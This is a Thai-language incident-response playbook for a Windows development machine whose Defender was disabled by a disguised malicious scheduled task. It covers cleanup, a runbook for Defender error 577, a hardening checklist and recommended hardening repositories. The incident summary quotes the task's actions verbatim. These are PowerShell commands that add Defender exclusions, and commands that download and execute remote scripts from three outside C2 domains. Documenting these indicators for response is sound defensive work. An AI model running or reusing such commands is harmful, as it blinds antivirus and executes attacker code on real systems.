# Security Playbook

เอกสารนี้เกิดจากเหตุการณ์จริงวันที่ 2026-11-15 บนเครื่องพัฒนา (Windows 10 Education 19045)
ใช้คู่กับ `docs/LIVING-QUEUE.md` (แถว `SEC-032`, `SEC-036`…`SEC-042`)

## 1. สรุปเหตุการณ์

Windows Defender ถูกปิดทั้งชั้น (`WinDefend` = Stopped) และเปิดกลับไม่ได้ แม้จะลบนโยบาย
`HKLM\SOFTWARE\Policies\Microsoft\Windows Defender` ออกแล้ว เพราะมี scheduled task ของผู้ไม่หวังดี
เขียนนโยบายเหล่านั้นกลับมาทุกครั้งที่บูต

```
\Microsoft\Windows\Legacy\OSVersionAgentLatest-w7l2t         (state = Running)

action 1: powershell -cOmma Add-MpPreference -ExclusionProcess (Get-Process -PID $PID).MainModule.ModuleName -Force
action 2: powershell -cOmma Add-MpPreference -ExclusionPath (Get-Location) -Force
action 3: powershell.exe -nop -Command "& ([scriptblock]::Create((Invoke-RestMethod 'x4-noven.net' -TimeoutSec 30)))"
action 4: powershell.exe -nop -Command "& ([scriptblock]::Create((Invoke-RestMethod 'afterhours51.com' -TimeoutSec 30)))"
action 5: powershell.exe -nop -Command "& ([scriptblock]::Create((Invoke-RestMethod 'littlewave-602.org' -TimeoutSec 30)))"
```

ลักษณะที่ต้องจำ: ชื่อ task เลียนแบบ Microsoft, อยู่ใน path ของ Microsoft, trigger แบบ event (ไม่ใช่เวลา),
ตั้ง exclusion ให้ตัวเองก่อน แล้วค่อยดาวน์โหลด payload

### สิ่งที่ทำไปแล้ว

| ขั้น | ผล |
|---|---|
| `Unregister-ScheduledTask` ลบ task ข้างต้น | สำเร็จ — `\Microsoft\Windows\Legacy` เหลือ 0 task |
| kill process ตัวโหลด C2 | สำเร็จ — pid 1380 (`Invoke-RestMethod x4-noven.net`) |
| ลบนโยบาย `Disable*` ทุกค่า + `PUAProtection=1` | สำเร็จ — เหลือ `DisableLocalAdminMerge, PUAProtection, RandomizeScheduleTaskTimes` |
| ตรวจซ้ำ process/task ที่ชี้ C2 | ไม่เหลือ |

### สิ่งที่ยังค้าง

`WinDefend` และ `MDCoreSvc` ยังสตาร์ทไม่ขึ้นด้วย **577** ("Windows cannot verify the digital signature")
ทั้งที่ `MsMpEng.exe` ตรวจแล้ว `sig=Valid` (CN=Microsoft Windows Publisher, 4.18.26100.4-0) และ platform ทั้ง 3 รุ่นมีไฟล์ครบ 63 ไฟล์

## 2. Runbook: Defender ขึ้น error 577

ไล่ตามลำดับ หยุดเมื่อ `Get-MpComputerStatus` รายงาน `AntivirusEnabled=True`:

```powershell
# 0) ยืนยันสถานะตั้งต้น
Get-Service WinDefend, MDCoreSvc | Select-Object Name, Status, StartType
Get-MpComputerStatus | Select-Object AMRunningMode, AntivirusEnabled, RealTimeProtectionEnabled

# 1) ซ่อมไฟล์ระบบ (ใช้เวลา 10-20 นาที)
sfc /scannow
DISM /Online /Cleanup-Image /RestoreHealth

# 2) เปิดบริการ
Set-Service WinDefend -StartupType Automatic
Start-Service WinDefend
Get-MpComputerStatus | Select-Object AMRunningMode, AntivirusEnabled, RealTimeProtectionEnabled

# 3) ถ้ายัง 577: อัปเดต platform ผ่าน Windows Update
UsoClient StartScan
```

ถ้าทั้งสามขั้นไม่แก้ → in-place repair install (Media Creation Tool, เลือก "Keep files and apps")
ก่อนถึงขั้นนั้นให้ export หลักฐาน: `Get-WinEvent -LogName 'Microsoft-Windows-CodeIntegrity/Operational' -MaxEvents 50`

## 3. Hardening checklist

สถานะจากการวัดจริง (`tools/security/host-audit.ps1`, 2026-11-15 22:52):

| รายการ | สถานะ |
|---|---|
| UAC (`ConsentPromptBehaviorAdmin=5`, `EnableLUA=1`) | ผ่าน |
| `Winlogon` ไม่ถูกแก้ (`Shell`, `Userinit`) | ผ่าน |
| SMB1 | ปิดแล้ว |
| RDP (`fDenyTSConnections=1`) | ปิดแล้ว |
| PowerShell `ScriptBlockLogging` | เปิดแล้ว (`=1`) |
| Firewall 3 โปรไฟล์ | เปิด แต่ `DefaultOutboundAction=NotConfigured` |
| LSA protection (`RunAsPPL`) | **ปิด — ต้องเปิด** |
| Credential Guard / VBS | **ปิด — ต้องเปิด** |
| บัญชี `Administrator` ในกลุ่ม Administrators | **ควรปิด/ทบทวน** |
| Defender exclusions | **ต้องตรวจด้วยสิทธิ์ admin** (malware เคยใส่ exclusion) |

คำสั่งที่ยังต้องรันด้วยสิทธิ์ admin (ต้อง reboot หลังตั้งค่า):

```powershell
# LSA protection
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -Value 1 -PropertyType DWord -Force
# VBS / Credential Guard
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard -Name EnableVirtualizationBasedSecurity -Value 1 -PropertyType DWord -Force
# ตรวจ exclusion ที่ malware อาจทิ้งไว้
(Get-MpPreference).ExclusionPath; (Get-MpPreference).ExclusionProcess
```

## 4. Repository ที่นำมาใช้ต่อ

Hardening:

| Repo | License | ใช้ทำอะไร |
|---|---|---|
| `HotCakeX/Harden-Windows-Security` | MIT | baseline หลัก: ASR rules, firewall, WDAC allowlist (AppControl Manager, Firewall Sentinel) |
| `AndyFul/ConfigureDefender` | freeware (ดู License.txt) | preset โปรไฟล์ Defender (DEFAULT/HIGH/INTERACTIVE/MAX) |
| `simeononsecurity/Windows-Defender-Hardening` | ดู repo | สคริปต์ Defender พร้อม `-WhatIf` และ snapshot ก่อนแก้ |

Security UX/UI (ใช้เป็นต้นแบบ layout/IA เท่านั้น):

| Repo | License | เหมาะกับ |
|---|---|---|
| `ShivOnly/threat-intelligence-ui` | ดู repo | ตรง stack ที่สุด: Next.js + Tailwind + Recharts + Zustand สำหรับหน้า IOC |
| `SiteQ8/secopsdash` | MIT | โครง dashboard แบบ SOC (Executive/Threat Intel/Vulnerability/Compliance/IR) |
| `BitterSecurity/Decepticon` | Apache-2.0 | control plane ของ engagement + React Flow attack graph |
| `Maiiaa30/ReconDashboard` | CC BY-NC-SA 4.0 | **ห้ามใช้เชิงพาณิชย์** — ใช้ได้แค่อ่านแนวคิด |

กติกา: ห้าม vendor ทั้งแอป และสคริปต์ระดับระบบ (`.ps1` ที่รันด้วย admin) ต้องรีวิวทีละบรรทัดก่อนสั่งรัน
